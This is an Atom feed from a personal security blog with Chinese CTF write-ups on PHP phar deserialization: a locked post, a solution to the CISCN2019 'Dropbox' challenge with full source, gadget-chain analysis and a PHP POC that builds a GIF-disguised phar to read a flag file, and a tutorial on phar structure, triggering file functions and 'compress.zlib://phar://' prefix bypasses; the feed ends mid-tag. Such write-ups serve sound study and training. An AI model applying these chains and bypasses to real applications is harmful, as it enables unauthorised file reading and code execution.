<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-03-16T03:32:57.807Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python网络编程小总结</title>
    <link href="https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/Python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%B0%8F%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-16T03:27:13.000Z</published>
    <updated>2020-03-16T03:32:57.807Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3079619048a6310f3ac16393c8b767e3fbff0dd0a11a79d5ad8e784217598621"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF反序列化题目总结(持续更新....)</title>
    <link href="https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-15T06:59:53.000Z</published>
    <updated>2020-03-16T03:29:24.758Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-入门题目"><a href="#一-入门题目" class="headerlink" title="一. 入门题目"></a>一. 入门题目</h3><p>代码如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><a id="more"></a><p>很简单的利用phar进行反序列化，POC如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>查看生成的phar文件：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><hr><h3 id="二-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#二-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="二.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>二.[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>题目知识点为：任意文件下载加phar反序列化。<br>我们直接看phar反序列化的地方：<br>delete.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个关键在于class这个文件中，分析如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>我们可以发现一个File类里面的close函数有一个文件处理函数，那么关键就在于怎么把这个close函数调用。<br>通过分析发现在FileList类里面有个<strong>call魔法函数，也就是说我们可以通过这个魔法函数触发File类里面的close函数。那么接着分析找到User类里面也有个close函数是在</strong>destruct()，那么思路就很清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.构造User类</span><br><span class="line">2.让User类的成员变量再构造一个FileList类</span><br><span class="line">3.让FileList类里面的$files数组里面包含File类</span><br><span class="line">4.File类的$filename变量为flag文件</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Poc</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-15</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File(<span class="string">'/flag.txt'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>再delete页面得到flag：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-入门题目&quot;&gt;&lt;a href=&quot;#一-入门题目&quot; class=&quot;headerlink&quot; title=&quot;一. 入门题目&quot;&gt;&lt;/a&gt;一. 入门题目&lt;/h3&gt;&lt;p&gt;代码如下：&lt;/p&gt;
&lt;img src=&quot;/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>利用phar进行反序列化扩展攻击简单总结</title>
    <link href="https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-15T03:59:09.000Z</published>
    <updated>2020-03-15T04:08:29.047Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件的组成"><a href="#phar文件的组成" class="headerlink" title="phar文件的组成"></a>phar文件的组成</h4><p>phar://的官方解释如下：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1.png" class title="This is an test image"><br>简单解释就是：通过phar://的处理可以把多个文件合成一个文件(类似压缩),但是php却可以不经过解压的方法，将多个文件解释执行。</p><p>phar文件结构分为四个部分组成：stub(文件标志)，meta-data，压缩文件内容，签名。<br>一. <strong>stub  文件标志</strong><br>格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx&lt;?php xxxxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure><br>二.<strong>meta-data</strong><br>每个被压缩的文件的权限，属性等信息都放在这里，这部分会以<strong>序列化</strong>的方式存储到phar文件的meta-data部分。<br><strong>这个部分是触发反序化的关键。</strong><br>三.<strong>压缩文件内容</strong><br>被压缩的文件的内容。<br>四.<strong>签名，放在文件末尾，格式如下</strong>：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/2.png" class title="This is an test image"><br>在PHP中我们不需要手动去写phar文件，因为php提供了一个phar类直接调用其中的方法即可。<br>一个小的demo文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Da4er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(<span class="string">"https://da4er.top"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果存在phar文件先删除</span></span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er1.phar"</span>);</span><br><span class="line"><span class="comment">//开始生成phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">//设置phar文件标志</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line"><span class="comment">//自定义的meta-data文件</span></span><br><span class="line">$o = <span class="keyword">new</span> Da4er();</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//将自定义的meta-data文件存入phar文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//在停止写入phar文件，自动生成签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/3.png" class title="This is an test image"><br>发现我们自定义的meta-data反序化写入到了phar文件中。</p><h4 id="触发反序化的文件函数"><a href="#触发反序化的文件函数" class="headerlink" title="触发反序化的文件函数"></a>触发反序化的文件函数</h4><p>经过上面对phar文件的理解，我们清除了phar文件中包含序列化对象，那么该怎么利用呢。这里就需要使用php内置的文件处理函数。<strong>因为大部分的文件处理函数在底层都是调用的unserialize函数。</strong><br>参考博客：<a href="https://xz.aliyun.com/t/2958#toc-0">1</a><br>受影响的文件函数如下：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/4.png" class title="This is an test image"><br>如果这些文件函数的参数<strong>可控</strong>的话，我们就可以进行反序化漏洞的利用。<br>demo代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Da4er&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        var_dump(&quot;https:&#x2F;&#x2F;da4er.top&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename &#x3D; &quot;phar:&#x2F;&#x2F;da4er1.phar&quot;;</span><br><span class="line">@file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>触发效果如下：<br><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/5.png" class title="This is an test image"><br>常见的绕过方式：如果题目限制的不能以phar://开头，那么我们可以使用如下方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br><span class="line"></span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br></pre></td></tr></table></figure><h3 